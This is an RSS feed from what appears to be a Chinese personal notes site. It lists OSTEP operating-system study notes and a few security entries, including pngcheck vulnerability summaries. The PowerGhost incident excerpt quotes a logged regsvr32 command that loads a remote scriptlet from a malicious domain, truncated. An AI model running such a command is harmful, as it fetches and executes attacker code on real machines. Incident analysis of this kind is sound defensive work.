<?xml version="1.0" encoding="UTF-8" ?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/"> <channel><title>Recent Notes</title><link>https://13m0n4de.vercel.app/</link><atom:link href="https://13m0n4de.vercel.app/feed_rss_updated.xml" rel="self" type="application/rss+xml" /><docs>https://github.com/13m0n4de/notebook</docs><language>zh</language> <pubDate>Wed, 20 Aug 2025 10:49:34 -0000</pubDate> <lastBuildDate>Wed, 20 Aug 2025 10:49:34 -0000</lastBuildDate> <ttl>1440</ttl> <generator>MkDocs RSS plugin - v1.17.0</generator> <image> <url>None</url> <title>Recent Notes</title><link>https://13m0n4de.vercel.app/</link> </image> <item> <title>Index</title> <description></description><link>https://13m0n4de.vercel.app/cs/compiler/engineering_a_compiler/index.html</link> <pubDate>Wed, 20 Aug 2025 10:49:36 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/compiler/engineering_a_compiler/index.html</guid> </item> <item> <title>OSTEP 学习笔记</title> <description>&lt;h1&gt;OSTEP 学习笔记&lt;/h1&gt;&lt;p&gt;!!! abstract &#34;资源&#34;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;- [OSTEP](https://pages.cs.wisc.edu/~remzi/OSTEP/)- [OSTEP 中文翻译](https://github.com/remzi-arpacidusseau/ostep-trans...&lt;/code&gt;&lt;/pre&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/index.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/index.html</guid> </item> <item> <title>02.Introduction</title> <description>&lt;h1&gt;第 2 章 操作系统介绍&lt;/h1&gt;&lt;p&gt;这章引入了课程的三个主题，也是操作系统的三个重要功能：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;虚拟化&lt;/li&gt;&lt;li&gt;并发&lt;/li&gt;&lt;li&gt;持久性&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;作者介绍的时候用了一些代码示例，其中许多函数都被刻意包装了一层，我不太喜欢，而且一开始我也不知道有附录代码，就全都重新改了一遍。&lt;/p&gt;&lt;p&gt;附录代码：[github.com/remzi-ar...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/02introduction.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/02introduction.html</guid> </item> <item> <title>04.Processes</title> <description>&lt;h1&gt;第 4 章 抽象：进程&lt;/h1&gt;&lt;p&gt;这章介绍了进程的概念，为了虚拟化 CPU 做铺垫。&lt;/p&gt;&lt;p&gt;进程是一个正在运行的程序，既然正在运行，那就肯定有状态，包括程序的寄存器值以及用到的内存值，操作系统需要分配一些内存将它们需要保存下来。&lt;/p&gt;&lt;p&gt;保存是为了切换，切换是因为需要调度，调度是为了最大化利用系统资源。&lt;/p&gt;&lt;p&gt;为了实现任意切换的“...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/04processes.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/04processes.html</guid> </item> <item> <title>05.Process API</title> <description>&lt;h1&gt;第 5 章 插叙：进程 API&lt;/h1&gt;&lt;p&gt;这章只是介绍了一些有关进程的 API。&lt;/p&gt;&lt;p&gt;| 系统调用 | 功能 | 返回值 | 备注 ...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/05process_api.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/05process_api.html</guid> </item> <item> <title>06.Direct Execution</title> <description>&lt;h1&gt;第 6 章 机制：受限直接执行&lt;/h1&gt;&lt;p&gt;这章是讲特权级机制和进程调度的，介绍虚拟化 CPU 过程中会遇到的问题以及解决方案，对应：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;[rCore-Tutorial-Book 特权级机制](https://rcore-os.cn/rCore-Tutorial-Book-v3/chapter2/1rv-privi...&lt;/li&gt;&lt;/ul&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/06direct_execution.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/06direct_execution.html</guid> </item> <item> <title>07.CPU Scheduling</title> <description>&lt;h1&gt;第 7 章 进程调度：介绍&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;./06direct_execution.md&#34;&gt;上一章&lt;/a&gt;介绍了进程调度的底层机制（mechanism）（上下文切换），这章介绍的是上层策略（policy）。&lt;/p&gt;&lt;h2&gt;7.1 工作负载假设&lt;/h2&gt;&lt;p&gt;可能是翻译问题，对照着原文我才读明白是什么意思。&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;let us first ma...&lt;/p&gt;&lt;/blockquote&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/07cpu_scheduling.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/07cpu_scheduling.html</guid> </item> <item> <title>08.Multi-level Feedback</title> <description>&lt;h1&gt;第 8 章 调度：多级反馈队列&lt;/h1&gt;&lt;p&gt;多级反馈队列（Multi-level Feedback Queue, MLFQ）&lt;/p&gt;&lt;h2&gt;8.1 MLFQ：基本规则&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;MLFQ 中有许多独立的队列（queue），每个队列有不同的优先级（priority level）。任何时刻，一个工作只能存在于一个队列中。MLFQ 总...&lt;/p&gt;&lt;/blockquote&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/08multi_level_feedback.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/08multi_level_feedback.html</guid> </item> <item> <title>09.Lottery Scheduling</title> <description>&lt;h1&gt;第 9 章 调度：比例份额&lt;/h1&gt;&lt;p&gt;!!! quote&lt;/p&gt;&lt;pre&gt;&lt;code&gt;比例份额（proportional-share）调度程序，有时也称为公平份额（fair-share）调度程序。比例份额算法基于一个简单的想法：调度程序的最终目标，是确保每个工作获得一定比例的 CPU 时间，而不是优化周转时间和响应时间。&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/09lottery_scheduling.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/09lottery_scheduling.html</guid> </item> <item> <title>13.Address Spaces</title> <description>&lt;h1&gt;第 13 章 抽象：地址空间&lt;/h1&gt;&lt;p&gt;终于，在年后追上了 Rust 内核项目的进度……比预期的晚了一些。（看&lt;a href=&#34;../../../changelog.md#2024&#34;&gt;时间线&lt;/a&gt;就知道忙了些什么七七八八的）&lt;/p&gt;&lt;p&gt;参考：[rCore-Tutorial-Book-v3 #地址空间](https://rcore-os.cn/r...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/13address_spaces.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/13address_spaces.html</guid> </item> <item> <title>14.Memory API</title> <description>&lt;h1&gt;第 14 章 插叙：内存操作 API&lt;/h1&gt;&lt;p&gt;上次插叙是 &lt;a href=&#34;./05process_api.md&#34;&gt;5.Process API&lt;/a&gt;，写了好多无聊的代码，好累。&lt;/p&gt;&lt;h2&gt;14.1 内存类型&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;栈内存&lt;/strong&gt; 和 &lt;strong&gt;堆内存&lt;/strong&gt;。&lt;/p&gt;&lt;p&gt;```cvoid func() { int x; // declares an...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/14memory_api.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/14memory_api.html</guid> </item> <item> <title>15.Address Translation</title> <description>&lt;h1&gt;第 15 章 机制：地址转换&lt;/h1&gt;&lt;p&gt;这章是讲如何高效、灵活地虚拟化内存。&lt;/p&gt;&lt;p&gt;当 CPU 取指令或者执行一条访存指令的时候，它都是基于虚拟地址访问属于当前正在运行的应用的地址空间。&lt;/p&gt;&lt;p&gt;此时，CPU 中的 &lt;strong&gt;内存管理单元（MMU, Memory Management Unit）&lt;/strong&gt; 自动将这个虚拟地址进行 **地址...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/15address_translation.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/15address_translation.html</guid> </item> <item> <title>16.Segmentation</title> <description>&lt;h1&gt;第 16 章 分段&lt;/h1&gt;&lt;p&gt;之前一直将所有进程的地址空间完整地加载到内存中，栈和堆之间，有一大块“空闲”空间。&lt;/p&gt;&lt;p&gt;另外，如果剩余的物理内存无法提供连续区域来放置完整的地址空间，进程便无法运行。&lt;/p&gt;&lt;p&gt;这章讲的就是如何使用 &lt;strong&gt;分段（Segmentation）&lt;/strong&gt; 解决它们。&lt;/p&gt;&lt;h2&gt;16.1 分段：泛化的基址/界限&lt;/h2&gt;&lt;p&gt;...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/16segmentation.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/16segmentation.html</guid> </item> <item> <title>17.Free Space Management</title> <description>&lt;h1&gt;第 17 章 空闲空间管理&lt;/h1&gt;&lt;p&gt;上一章遇到了外部碎片的问题，这章介绍几个策略来尽可能减少碎片。&lt;/p&gt;&lt;h2&gt;17.1 假设&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;内存分配库的接口就像 &lt;code&gt;#!c malloc()&lt;/code&gt; 和 &lt;code&gt;#!c free()&lt;/code&gt; 提供的那样，分配时只传入大小，回收时只传入指针；&lt;/li&gt;&lt;li&gt;不在意内部碎片（分配程序给出的内存块超出请求的...&lt;/li&gt;&lt;/ol&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/17free_space_management.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/17free_space_management.html</guid> </item> <item> <title>18.Introduction to Paging</title> <description>&lt;h1&gt;第 18 章 分页：介绍&lt;/h1&gt;&lt;p&gt;十六章尝试使用分段来解决空间管理问题，十七章尝试使用各种空闲空间管理策略来减少分段带来的碎片问题。&lt;/p&gt;&lt;p&gt;另一种方式叫做 &lt;strong&gt;分页（Paging）&lt;/strong&gt;，采用了固定长度的分片，从根本上避免了碎片（外部碎片）。&lt;/p&gt;&lt;h2&gt;18.1 一个简单例子&lt;/h2&gt;&lt;p&gt;以下例子展示了一个只有 64 字节的小地址空...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/18introduction_to_paging.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/18introduction_to_paging.html</guid> </item> <item> <title>19.Translation Lookaside Buffers</title> <description>&lt;h1&gt;第 19 章 分页：快速地址转换（TLB）&lt;/h1&gt;&lt;p&gt;在分页中，每次指令获取、加载和保存，都要额外读一次内存，慢得无法接受。&lt;/p&gt;&lt;p&gt;这一章介绍了硬件——&lt;strong&gt;地址转换旁路缓冲器（translation-lookaside-buffer）&lt;/strong&gt;，每次内存访问时，硬件先检查 TLB，如果存在匹配的映射，就直接完成转换，不用访问页...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/19translation_lookaside_buffers.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/19translation_lookaside_buffers.html</guid> </item> <item> <title>20.Advanced Page Tables</title> <description>&lt;h1&gt;第 20 章 分页：较小的表&lt;/h1&gt;&lt;p&gt;上章解决了速度问题，这章解决内存问题。&lt;/p&gt;&lt;p&gt;总之就是三种方案：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用更大的页，页更大，页表就更小；&lt;/li&gt;&lt;li&gt;使用分段和分页混合，减少一些无效区域；&lt;/li&gt;&lt;li&gt;改进页表的结构，从线性改为树或其他结构。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;20.1 简单的解决方案：更大的页&lt;/h2&gt;&lt;p&gt;很简单的思路，页更大，表就更小。&lt;/p&gt;&lt;p&gt;但...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/cs/os/ostep/20advanced_page_tables.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/cs/os/ostep/20advanced_page_tables.html</guid> </item> <item> <title>PowerGhost</title> <category>Security > Incidents ></category> <description>&lt;h1&gt;PowerGhost&lt;/h1&gt;&lt;h2&gt;事件背景&lt;/h2&gt;&lt;p&gt;EDR 记录多台主机频繁访问恶意域名 &lt;code&gt;auth[.]to0ls[.]com&lt;/code&gt;，匹配 PowerGhost IoC。&lt;/p&gt;&lt;p&gt;记录命令行：&lt;/p&gt;&lt;p&gt;```C:\Windows\system32\regsvr32.EXE /u /s /i:http://auth.to0ls...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/sec/incidents/powerghost.html</link> <pubDate>Thu, 31 Jul 2025 05:57:44 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/sec/incidents/powerghost.html</guid> </item> <item> <title>CVE-2020-35511</title> <category>Security > Vulns > pngcheck ></category> <description>&lt;h1&gt;CVE-2020-35511&lt;/h1&gt;&lt;p&gt;!!! Abstract&lt;/p&gt;&lt;pre&gt;&lt;code&gt;- **CVE ID**: CVE-2020-35511- **CWE ID**: CWE-126 (Buffer Over-read)- **Description**: A global buffer overflow...&lt;/code&gt;&lt;/pre&gt;</description><link>https://13m0n4de.vercel.app/sec/vulns/pngcheck/cve-2020-35511.html</link> <pubDate>Thu, 17 Apr 2025 17:37:08 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/sec/vulns/pngcheck/cve-2020-35511.html</guid> </item> <item> <title>vulns-2.4.0</title> <category>Security > Vulns > pngcheck ></category> <description>&lt;h1&gt;Vulns in pngcheck 2.4.0&lt;/h1&gt;&lt;h2&gt;漏洞概要&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;多处缓冲区越界读取（处理多个 MNG 块 (DBYK, DISC, DROP, LOOP, nEED, ORDR, PAST, PPLT, SAVE, SEEK) 时）&lt;/li&gt;&lt;li&gt;NULL 指针解引用（处理 sCAL 块时）&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;...&lt;/p&gt;</description><link>https://13m0n4de.vercel.app/sec/vulns/pngcheck/vulns-2.4.0.html</link> <pubDate>Thu, 17 Apr 2025 17:37:08 +0000</pubDate><source url="https://13m0n4de.vercel.app/feed_rss_updated.xml">Recent Notes</source><guid isPermaLink="true">https://13m0n4de.vercel.app/sec/vulns/pngcheck/vulns-2.4.0.html</guid> </item> </channel></rss>